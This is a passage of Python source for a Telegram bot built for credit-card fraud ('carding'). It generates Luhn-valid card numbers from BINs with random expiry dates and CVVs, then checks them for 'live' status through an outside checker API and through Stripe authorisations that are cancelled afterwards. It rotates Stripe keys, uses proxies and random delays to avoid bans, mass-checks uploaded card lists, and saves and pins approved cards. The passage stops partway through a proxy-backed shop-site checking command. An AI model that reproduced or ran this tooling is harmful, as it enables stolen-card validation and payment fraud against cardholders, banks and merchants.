        return await event.reply("🚫 Wrong command!\nUse /addadmin, /addpxy etc. separately.")

    try:
        add_text = event.raw_text[4:].strip()   # remove /add or .add
        if not add_text:
            return await event.reply(
                "Format: `/add site.com shop.com https://example.com`\n\n"
                "Multiple OK — space or new line\n"
                "Only real domains (no IPs/proxies)"
            )

        potential = extract_urls_from_text(add_text)
        sites_to_add = []
        for part in potential:
            normalized = normalize_domain(part)
            if not normalized:
                continue
            # Block proxy/IP attempts
            if (':' in normalized and normalized.count(':') > 1) or \
               re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d+)?$', normalized) or \
               normalized.startswith(('socks', 'http://', 'https://')):
                continue
            if '.' not in normalized or len(normalized.split('.')[-1]) < 2:
                continue
            if normalized not in sites_to_add:
                sites_to_add.append(normalized)

        if not sites_to_add:
            return await event.reply(
                "❌ No valid domains detected\n\n"
                "Examples that work:\n"
                "→ shop.com\n"
                "→ example.myshopify.com\n"
                "→ test-store.com/products\n"
                "→ https://xyz.myshopify.com\n\n"
                "Paste real sites only — proxies go to /addpxy"
            )

        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        added = []
        already = []
        for site in sites_to_add:
            if site in user_sites:
                already.append(site)
            else:
                user_sites.append(site)
                added.append(site)

        if added or already:
            sites[str(event.sender_id)] = user_sites
            await save_json(SITE_FILE, sites)

        parts = []
        if added:
            parts.append(f"✅ Added {len(added)} new site(s):\n" + "\n".join(f"→ `{s}`" for s in added))
        if already:
            parts.append(f"⚠️ Already in list ({len(already)}):\n" + "\n".join(f"→ `{s}`" for s in already))
        if not parts:
            parts.append("No changes — all already saved")
        parts.append(f"\nTotal sites: {len(user_sites)}")
        await event.reply("\n\n".join(parts))

    except Exception as e:
        await event.reply(f"❌ Error: {str(e)[:100]}")

def normalize_domain(url: str) -> str:
    """Clean domain – strict mode for /add only"""
    url = url.strip().lower()
    
    # Remove protocol
    if url.startswith(('http://', 'https://')):
        url = url.split('://', 1)[1]
    
    # Remove path, query, port
    url = url.split('/', 1)[0]
    url = url.split('?', 1)[0]
    url = url.split(':', 1)[0]  # remove any :port
    
    url = url.rstrip('.')
    
    if url.startswith('www.'):
        url = url[4:]
    
    # Final check: must look like domain
    if not re.match(r'^[a-z0-9][a-z0-9\-\.]*\.[a-z]{2,}$', url):
        return None
    
    return url.strip()

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())

    try:
        rm_text = event.raw_text[3:].strip().lower()

        if not rm_text:
            return await event.reply(
                "Format:\n"
                "→ `/rm site.com` → remove one\n"
                "→ `/rm 1` → remove by number\n"
                "→ `/rm dead` → kill all dead sites\n"
                "→ `/rm all` → nuke everything"
            )

        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])

        if not user_sites:
            return await event.reply("❌ No sites saved yet.")

        removed = []
        not_found = []

        # ─── REMOVE ALL ─────────────────────────────────────────────
        if rm_text == "all":
            confirm_msg = await event.reply(
                f"☠️ **NUKE ALL {len(user_sites)} SITES?**\n"
                "This cannot be undone.\n"
                "Reply with `yes` to confirm or anything else to cancel."
            )

            def check_yes(e):
                return e.sender_id == event.sender_id and e.raw_text.strip().lower() == "yes"

            try:
                response = await client.wait_for_event(events.NewMessage, check_yes, timeout=30)
                await confirm_msg.delete()
                sites[str(event.sender_id)] = []
                await save_json(SITE_FILE, sites)
                return await event.reply("💀 All sites nuked. Clean slate.")
            except asyncio.TimeoutError:
                await confirm_msg.edit("❌ Cancelled — no sites removed.")
                return

        # ─── REMOVE DEAD ────────────────────────────────────────────
        elif rm_text == "dead":
            if not user_sites:
                return await event.reply("No sites to test.")

            dead_removed = []
            status_msg = await event.reply(f"🩸 Testing {len(user_sites)} sites for dead ones...")

            for idx, site in enumerate(user_sites, 1):
                result = await test_single_site(site, user_id=event.sender_id)
                if result["status"] != "working":
                    dead_removed.append(site)

            if dead_removed:
                for dead_site in dead_removed:
                    user_sites.remove(dead_site)
                sites[str(event.sender_id)] = user_sites
                await save_json(SITE_FILE, sites)

                await status_msg.edit(
                    f"☠️ Removed {len(dead_removed)} dead sites\n"
                    f"Remaining: {len(user_sites)}\n\n"
                    + "\n".join(f"→ {s}" for s in dead_removed)
                )
            else:
                await status_msg.edit("✅ No dead sites found. All live.")

            return

        # ─── REMOVE BY INDEX ────────────────────────────────────────
        elif rm_text.isdigit():
            index = int(rm_text) - 1
            if 0 <= index < len(user_sites):
                removed_site = user_sites.pop(index)
                sites[str(event.sender_id)] = user_sites
                await save_json(SITE_FILE, sites)
                return await event.reply(f"✅ Removed site #{index+1}: `{removed_site}`\nTotal left: {len(user_sites)}")
            else:
                return await event.reply(f"❌ Invalid index. You have {len(user_sites)} sites (1–{len(user_sites)})")

        # ─── REMOVE SPECIFIC SITE ───────────────────────────────────
        else:
            sites_to_remove = extract_urls_from_text(rm_text)
            if not sites_to_remove:
                return await event.reply("❌ No valid domain found in input.")

            for site in sites_to_remove:
                normalized = normalize_domain(site)
                if normalized in user_sites:
                    user_sites.remove(normalized)
                    removed.append(normalized)
                else:
                    not_found.append(site)

            if removed:
                sites[str(event.sender_id)] = user_sites
                await save_json(SITE_FILE, sites)

            parts = []
            if removed:
                parts.append("✅ Removed:\n" + "\n".join(f"→ `{s}`" for s in removed))
            if not_found:
                parts.append("❌ Not found:\n" + "\n".join(f"→ `{s}`" for s in not_found))

            parts.append(f"\nTotal sites left: {len(user_sites)}")
            await event.reply("\n".join(parts) if parts else "No changes.")

    except Exception as e:
        await event.reply(f"❌ Error: {str(e)[:100]}")

@client.on(events.NewMessage(pattern='/addpxy'))
async def add_proxy(event):
    if event.is_group:
        return await event.reply("🔒 This command only works in private chat to protect your proxies!")

    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    try:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) != 2:
            return await event.reply(
                "📌 **Supported Formats:**\n\n"
                "`/addpxy 1.2.3.4:8080`\n"
                "`/addpxy 1.2.3.4:8080:user:pass`\n"
                "`/addpxy user:pass@5.6.7.8:1080`\n"
                "`/addpxy socks5://user:pass@5.6.7.8:1080`\n"
                "`/addpxy http://9.10.11.12:3128`\n"
                "`/addpxy socks4://1.2.3.4:1080:user:pass`"
            )

        proxy_str = parts[1].strip()
        proxy_data = parse_proxy(proxy_str)

        if not proxy_data:
            return await event.reply("❌ Could not parse proxy. Please use one of the formats above.")

        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])

        if len(user_proxies) >= 10:
            return await event.reply("❌ Proxy limit reached (10 max)!")

        # Duplicate check
        for existing in user_proxies:
            if existing['proxy_url'] == proxy_data['proxy_url']:
                return await event.reply("⚠️ This exact proxy is already added!")

        # Test proxy
        testing_msg = await event.reply(f"🔄 Testing {proxy_data['type'].upper()} proxy...")
        is_working, result = await test_proxy(proxy_data['proxy_url'])

        if not is_working:
            await testing_msg.edit(f"❌ Proxy is dead!\n\nError: {result}")
            return

        # Add proxy
        user_proxies.append(proxy_data)
        proxies[str(event.sender_id)] = user_proxies
        await save_json(PROXY_FILE, proxies)

        auth_display = f"👤 {proxy_data['username']}" if proxy_data.get('username') else "🔓 No auth"
        await testing_msg.edit(
            f"✅ **Proxy Added Successfully!**\n\n"
            f"🌐 {proxy_data['ip']}:{proxy_data['port']}\n"
            f"🔐 Type: {proxy_data['type'].upper()}\n"
            f"{auth_display}\n"
            f"📊 Total proxies: {len(user_proxies)}/10"
        )

    except Exception as e:
        await event.reply(f"❌ Error: {str(e)[:120]}")

@client.on(events.NewMessage(pattern='/rmpxy'))
async def remove_proxy(event):
    # This command works in private only
    if event.is_group:
        return await event.reply("🔒 𝙏𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙤𝙣𝙡𝙮 𝙬𝙤𝙧𝙠𝙨 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩!")
    
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    
    try:
        proxies = await load_json(PROXY_FILE)
        user_proxies = proxies.get(str(event.sender_id), [])
        
        if not user_proxies:
            return await event.reply("❌ 𝙔𝙤𝙪 𝙙𝙤𝙣'𝙩 𝙝𝙖𝙫𝙚 𝙖𝙣𝙮 𝙥𝙧𝙤𝙭𝙮 𝙨𝙖𝙫𝙚𝙙!")
        
        parts = event.raw_text.split(maxsplit=1)
        
        # If no argument, show usage
        if len(parts) == 1:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /rmpxy <index>\n𝙊𝙧: /rmpxy all\n\n𝙐𝙨𝙚 /proxy 𝙩𝙤 𝙨𝙚𝙚 𝙞𝙣𝙙𝙚𝙭 𝙣𝙪𝙢𝙗𝙚𝙧𝙨")
        
        arg = parts[1].strip().lower()
        
        # Remove all proxies
        if arg == 'all':
            del proxies[str(event.sender_id)]
            await save_json(PROXY_FILE, proxies)
            return await event.reply(f"✅ 𝘼𝙡𝙡 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮!")
        
        # Remove by index
        try:
            index = int(arg) - 1  # Convert to 0-based index
            
            if index < 0 or index >= len(user_proxies):
                return await event.reply(f"❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙔𝙤𝙪 𝙝𝙖𝙫𝙚 {len(user_proxies)} 𝙥𝙧𝙤𝙭𝙞𝙚𝙨 (1-{len(user_proxies)})")
            
            removed_proxy = user_proxies.pop(index)
            
            if user_proxies:
                proxies[str(event.sender_id)] = user_proxies
            else:
                del proxies[str(event.sender_id)]
            
            await save_json(PROXY_FILE, proxies)
            
            await event.reply(f"✅ 𝙋𝙧𝙤𝙭𝙮 𝙧𝙚𝙢𝙤𝙫𝙚𝙙!\n\n📍 {removed_proxy['ip']}:{removed_proxy['port']}\n📊 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜: {len(user_proxies)}")
            
        except ValueError:
            return await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙞𝙣𝙙𝙚𝙭!\n\n𝙐𝙨𝙚: /rmpxy 1 𝙤𝙧 /rmpxy all")
        
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/proxy'))
async def view_proxy(event):
    if event.is_group:
        return await event.reply("🔒 This command only works in private chat!")

    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    user_proxies = await get_all_user_proxies(event.sender_id)

    if not user_proxies:
        return await event.reply("❌ You have no proxies saved.\nUse `/addpxy` to add one.")

    text = f"📡 **Your Proxies** ({len(user_proxies)}/10)\n\n"
    for idx, p in enumerate(user_proxies, 1):
        auth = f" | 👤 {p['username']}" if p.get('username') else ""
        text += f"`{idx}.` {p['type'].upper()} → {p['ip']}:{p['port']}{auth}\n"

    text += "\n💡 Use `/rmpxy <number>` or `/rmpxy all` to remove"
    await event.reply(text)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]gen(?:\s+(\d+))?\s*(\d{6})?\s*(\d+)?'))
async def gen_cards(event):
    """
    /gen [amount] [bin] [cvv]
    Examples:
    • /gen 411111
    • /gen 100 545301
    • /gen 30 434256 777
    """
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())

    if not can_access:
        return await event.reply(
            "🚫 Unauthorized!\nUse in group for free or get premium.",
            buttons=[[Button.url("Join Group", "https://t.me/deebuchecked")]]
        )

    # ─── Better Argument Parsing ─────────────────────────────────────
    parts = event.raw_text.split()
    amount = 50
    bin_input = None
    fixed_cvv = None

    for p in parts[1:]:
        if p.isdigit():
            if 6 <= len(p) <= 8:          # BIN
                bin_input = p
            elif len(p) in [3, 4]:        # CVV
                fixed_cvv = p
            elif 1 <= int(p) <= 300:      # Amount
                amount = int(p)

    if not bin_input:
        return await event.reply(
            "**Usage Examples:**\n"
            "• `/gen 411111` → 50 cards\n"
            "• `/gen 100 545301` → 100 cards\n"
            "• `/gen 30 434256 777` → 30 cards with fixed CVV 777\n\n"
            "Max amount: **300** (anti-ban)"
        )

    if not bin_input.isdigit() or not (6 <= len(bin_input) <= 8):
        return await event.reply("❌ BIN must be 6–8 digits (e.g. `411111` or `54530111`)")

    amount = min(max(amount, 1), 300)

    loading = await event.reply(f"🔄 Generating & checking **{amount}** cards with BIN `{bin_input}`...")

    live = []
    dead = 0
    error = 0

    async with aiohttp.ClientSession() as session:
        for _ in range(amount):
            card_number = generate_card_from_bin(bin_input)
            month = random.randint(1, 12)
            year = random.randint(25, 29)
            cvv = fixed_cvv if fixed_cvv else f"{random.randint(0,999):03d}"

            full_cc = f"{card_number}|{month:02d}|{year:02d}|{cvv}"

            try:
                async with session.get(
                    f"https://api.chkr.cc/?cc={full_cc}",
                    timeout=12
                ) as resp:
                    if resp.status != 200:
                        error += 1
                        continue

                    text = await resp.text()
                    text_lower = text.lower()

                    if any(word in text_lower for word in ["approved", "success", "live", "valid", "pass", "ok"]):
                        live.append(full_cc)
                    else:
                        dead += 1

            except Exception:
                error += 1

            await asyncio.sleep(random.uniform(0.7, 1.9))  # Rate limit

    # ─── Final Result ────────────────────────────────────────────────
    result = f"""**GEN Result — BIN {bin_input}**
Cards Generated: **{amount}**
✅ **Live/Hits:** {len(live)}
❌ **Dead:** {dead}
⚠️ **Errors:** {error}
"""

    if live:
        result += "\n**Live Cards:**\n```\n"
        result += "\n".join(live)
        result += "\n```"

        try:
            async with aiofiles.open("live_cards.txt", "a", encoding="utf-8") as f:
                await f.write("\n".join(live) + "\n")
            result += "\n→ Saved to `live_cards.txt`"
        except:
            result += "\n→ Could not save to file"
    else:
        result += "\nNo live cards found in this batch."

    await loading.edit(result)


# Helper: Luhn compliant card generator (Improved)
def generate_card_from_bin(bin_str: str) -> str:
    """Generates valid card number from BIN with Luhn checksum"""
    # Make sure BIN is 6-8 digits
    bin_str = bin_str[:8]
    
    # Pad to 15 digits (we'll add checksum as 16th)
    prefix = bin_str.ljust(15, '0')
    digits = [int(d) for d in prefix]

    # Luhn Algorithm
    for i in range(len(digits)-2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9

    total = sum(digits)
    check_digit = (10 - (total % 10)) % 10

    return prefix[:-1] + str(check_digit)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]st(\s+|$)'))
async def st_command(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", "https://t.me/+pNplrRLrEGY5NTU0")]]
        return await event.reply(
            "🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n"
            "𝙐𝙨𝙚 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚 𝙤𝙧 𝙜𝙚𝙩 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙛𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚.",
            buttons=buttons
        )

    # Extract card
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    else:
        card = extract_card(event.raw_text)

    if not card:
        return await event.reply(
            "𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /st 4111111111111111|12|34|567\n"
            "𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤"
        )

    loading = await event.reply("🍳 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙘𝙖𝙧𝙙...")
    try:
        stripe.api_key = random.choice(STRIPE_KEYS)
        cc, mm, yy, cvv = card.split("|")
        exp_year = int("20" + yy) if len(yy) == 2 else int(yy)

        intent = stripe.PaymentIntent.create(
            amount=AUTH_AMOUNT_CENTS,
            currency="usd",
            payment_method_data={
                "type": "card",
                "card": {
                    "number": cc,
                    "exp_month": int(mm),
                    "exp_year": exp_year,
                    "cvc": cvv,
                },
            },
            confirm=True,
            capture_method="manual",
            description="Bot CC check - auth only",
            metadata={"bot": "cc_checker", "user_id": str(event.sender_id)},
        )

        if intent.status in ["requires_capture", "succeeded"]:
            stripe.PaymentIntent.cancel(intent.id, cancellation_reason="requested_by_customer")
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            response_text = "Card passed $0.50 auth (no 3DS triggered)"
            price = f"${AUTH_AMOUNT_CENTS/100:.2f}"
            status_result = "Approved"
        elif intent.status == "requires_action":
            status_header = "3D SECURE REQUIRED ⚠️"
            response_text = "Card requires 3DS verification"
            price = "-"
            status_result = "3DS"
        else:
            err = intent.last_payment_error
            decline_code = err.decline_code if err else "unknown"
            message = err.message if err else "Unknown decline"
            status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
            response_text = f"{message} ({decline_code})"
            price = "-"
            status_result = "Declined"

        brand, bin_type, level, bank, country, flag = await get_bin_info(cc)

        result_msg = f"""{status_header}
𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {response_text}
```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```
"""
        await loading.delete()
        sent = await event.reply(result_msg)

        if "approved" in status_header.lower() or "succeeded" in intent.status:
            await save_approved_card(card, status_result, response_text, "Stripe Direct", price)
        if "approved" in status_header.lower():
            await pin_charged_message(event, sent)

    except stripe.error.CardError as e:
        await loading.edit(f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚: {e.user_message or str(e)}")
    except stripe.error.AuthenticationError:
        await loading.edit("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙤𝙧 𝙧𝙚𝙫𝙤𝙠𝙚𝙙 𝙎𝙩𝙧𝙞𝙥𝙚 𝙠𝙚𝙮")
    except stripe.error.RateLimitError:
        await loading.edit("⏳ 𝙍𝙖𝙩𝙚 𝙡𝙞𝙢𝙞𝙩 — 𝙩𝙧𝙮 𝙖𝙜𝙖𝙞𝙣 𝙞𝙣 30𝙨")
    except Exception as e:
        await loading.edit(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
async def mst_command(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())

    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", "https://t.me/+pNplrRLrEGY5NTU0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙!", buttons=buttons)

    cards = []
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            cards = extract_all_cards(replied.text)
    else:
        cards = extract_all_cards(event.raw_text[4:])  # skip /mst

    if not cards:
        return await event.reply(
            "𝙁𝙤𝙧𝙢𝙖𝙩:\n"
            "/mst 4111|12|34|567 4111|12|34|567 ...\n"
            "𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 𝙘𝙖𝙧𝙙𝙨"
        )

    # Premium / free limit
    cc_limit = await get_cc_limit(access_type, event.sender_id)
    if len(cards) > cc_limit:
        cards = cards[:cc_limit]
        await event.reply(f"⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {cc_limit} (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)")

    loading = await event.reply(f"🍳 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {len(cards)} 𝙘𝙖𝙧𝙙𝙨...")

    success = 0
    declined = 0
    errors = 0

    for i, card in enumerate(cards, 1):
        try:
            stripe.api_key = random.choice(STRIPE_KEYS)

            cc_num, mm, yy, cvv = card.split("|")
            exp_year = int("20" + yy) if len(yy) == 2 else int(yy)

            intent = stripe.PaymentIntent.create(
                amount=AUTH_AMOUNT_CENTS,
                currency="usd",
                payment_method_data={
                    "type": "card",
                    "card": {
                        "number": cc_num,
                        "exp_month": int(mm),
                        "exp_year": exp_year,
                        "cvc": cvv,
                    },
                },
                confirm=True,
                capture_method="manual",
                description="Mass check - auth only",
            )

            if intent.status in ["requires_capture", "succeeded"]:
                stripe.PaymentIntent.cancel(intent.id, cancellation_reason="requested_by_customer")
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                resp = "Passed $0.50 auth"
                price = f"${AUTH_AMOUNT_CENTS/100:.2f}"
                success += 1
                await save_approved_card(card, "Approved", resp, "Stripe Direct", price)
            elif intent.status == "requires_action":
                status_header = "3DS REQUIRED ⚠️"
                resp = "Requires verification"
                price = "-"
            else:
                err = intent.last_payment_error
                status_header = "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"
                resp = err.message if err else "Unknown decline"
                price = "-"
                declined += 1

            brand, btype, level, bank, country, flag = await get_bin_info(cc_num)

            msg = f"""{status_header}
𝗖𝗖 ⇾ `{card}`
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {resp}
𝗣𝗿𝗶𝗰𝗲 ⇾ {price}
```𝗕𝗜𝗡: {brand} - {btype} - {level}
{ bank } | {country} {flag}```
Card {i}/{len(cards)}"""
            await event.reply(msg)

            await asyncio.sleep(random.uniform(1.2, 3.5))  # anti-flood

        except Exception as e:
            errors += 1
            await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙤𝙣 {card}: {str(e)}")

    await loading.edit(
        f"✅ 𝙈𝙖𝙨𝙨 𝙘𝙝𝙚𝙘𝙠 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙\n"
        f"Approved: {success} | Declined: {declined} | Errors: {errors}"
    )

ACTIVE_MSTXT = {}

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mstxt$'))
async def mstxt_command(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())

    if not can_access:
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙", buttons=[[Button.url("𝙐𝙨𝙚 𝙂𝙧𝙤𝙪𝙥", "https://t.me/+pNplrRLrEGY5NTU0")]])

    if event.sender_id in ACTIVE_MSTXT:
        return await event.reply("𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜... 𝙬𝙖𝙞𝙩")

    if not event.reply_to_msg_id:
        return await event.reply("𝙍𝙚𝙥𝙡𝙮 𝙩𝙤 .txt 𝙛𝙞𝙡𝙚 𝙬𝙞𝙩𝙝 /mstxt")

    reply_msg = await event.get_reply_message()
    if not reply_msg.document or not reply_msg.file.name.lower().endswith('.txt'):
        return await event.reply("𝙍𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 .𝙩𝙭𝙩 𝙛𝙞𝙡𝙚")

    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_all_cards(content)
        os.remove(file_path)
    except Exception as e:
        try: os.remove(file_path)
        except: pass
        return await event.reply(f"❌ 𝙁𝙞𝙡𝙚 𝙚𝙧𝙧𝙤𝙧: {e}")

    if not cards:
        return await event.reply("𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙤𝙪𝙣𝙙")

    cc_limit = await get_cc_limit(access_type, event.sender_id)
    if len(cards) > cc_limit:
        cards = cards[:cc_limit]
        await event.reply(f"⚠️ 𝙊𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝙘𝙖𝙧𝙙𝙨 (𝙡𝙞𝙢𝙞𝙩)")

    ACTIVE_MSTXT[event.sender_id] = True

    status_msg = await event.reply(f"🍳 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 {len(cards)} 𝙘𝙖𝙧𝙙𝙨...")

    approved = 0
    declined = 0
    errors = 0
    checked = 0

    for card in cards:
        if event.sender_id not in ACTIVE_MSTXT:
            break

        checked += 1
        try:
            stripe.api_key = random.choice(STRIPE_KEYS)

            cc_num, mm, yy, cvv = card.split("|")
            exp_year = int("20" + yy) if len(yy) == 2 else int(yy)

            intent = stripe.PaymentIntent.create(
                amount=AUTH_AMOUNT_CENTS,
                currency="usd",
                payment_method_data={
                    "type": "card",
                    "card": {
                        "number": cc_num,
                        "exp_month": int(mm),
                        "exp_year": exp_year,
                        "cvc": cvv,
                    },
                },
                confirm=True,
                capture_method="manual",
            )

            if intent.status in ["requires_capture", "succeeded"]:
                stripe.PaymentIntent.cancel(intent.id, cancellation_reason="requested_by_customer")
                status = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                resp = "Passed auth"
                price = f"${AUTH_AMOUNT_CENTS/100:.2f}"
                approved += 1
                await save_approved_card(card, "Approved", resp, "Stripe", price)
            elif intent.status == "requires_action":
                status = "3DS ⚠️"
                resp = "Needs 3DS"
                price = "-"
            else:
                err = intent.last_payment_error
                status = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
                resp = err.message if err else "Unknown"
                price = "-"
                declined += 1

            brand, btype, level, bank, country, flag = await get_bin_info(cc_num)

            msg = f"""{status}
𝗖𝗖 ⇾ `{card}`
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {resp}
𝗣𝗿𝗶𝗰𝗲 ⇾ {price}
```{brand} - {btype} - {level}
{bank} | {country} {flag}```
"""
            await event.reply(msg)

        except Exception as e:
            errors += 1
            await event.reply(f"❌ {card} → {str(e)}")

        await asyncio.sleep(random.uniform(1.5, 4.0))

        # Update progress
        progress = f"Progress: {checked}/{len(cards)} | Approved: {approved} | Declined: {declined} | Errors: {errors}"
        try:
            await status_msg.edit(progress, buttons=[[Button.inline("🛑 Stop", f"stop_mstxt:{event.sender_id}".encode())]])
        except:
            pass

    if event.sender_id in ACTIVE_MSTXT:
        ACTIVE_MSTXT.pop(event.sender_id)
        await status_msg.edit(
            f"✅ Finished\n"
            f"Approved: {approved}\n"
            f"Declined: {declined}\n"
            f"Errors: {errors}\n"
            f"Total: {len(cards)}"
        )

# Stop button
@client.on(events.CallbackQuery(pattern=rb"stop_mstxt:(\d+)"))
async def stop_mstxt(event):
    uid = int(event.pattern_match.group(1))
    if event.sender_id != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not your process", alert=True)

    if uid in ACTIVE_MSTXT:
        ACTIVE_MSTXT.pop(uid)
        await event.answer("🛑 Stopped", alert=True)
    else:
        await event.answer("Already finished", alert=True)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        return await event.reply("🚫 Unauthorized", buttons=[[Button.url("Join Group", "https://t.me/deebuchecked")]])
    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):
    card = None
    loading_msg = None
    loading_task = None
    start_time = time.time()

    try:
        proxy_data = await get_user_proxy(event.sender_id)
        if not proxy_data:
            return await event.reply("⚠️ Proxy required! Use /addpxy")

        if event.reply_to_msg_id:
            replied = await event.get_reply_message()
            card = extract_card(replied.text) if replied and replied.text else None
        else:
            card = extract_card(event.raw_text)

        if not card:
            return await event.reply("Format: /sh 4111111111111111|12|25|123\nOr reply with card")

        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites:
            return await event.reply("No sites. Use /add first")

        # Loading with your exact LOADING ID
        loading_msg = await event.reply(
            f"<tg-emoji emoji-id=\"{SPECIAL_EMOJIS['LOADING']}\"></tg-emoji> Cooking card...",
            parse_mode='html'
        )

        async def animate_loading():
            phrases = [
                f"<tg-emoji emoji-id=\"{SPECIAL_EMOJIS['LOADING']}\"></tg-emoji> Cooking...",
                f"<tg-emoji emoji-id=\"{SPECIAL_EMOJIS['LOADING']}\"></tg-emoji> Gateway...",
                f"<tg-emoji emoji-id=\"{SPECIAL_EMOJIS['LOADING']}\"></tg-emoji> Processing...",
                f"<tg-emoji emoji-id=\"{SPECIAL_EMOJIS['LOADING']}\"></tg-emoji> Finalizing..."
            ]
            i = 0
            while True:
                try:
                    await loading_msg.edit(phrases[i % 4], parse_mode='html')
                    i += 1
                    await asyncio.sleep(1.2)
                except Exception:
                    break

        loading_task = asyncio.create_task(animate_loading())

        try:
            res, site_index = await asyncio.wait_for(
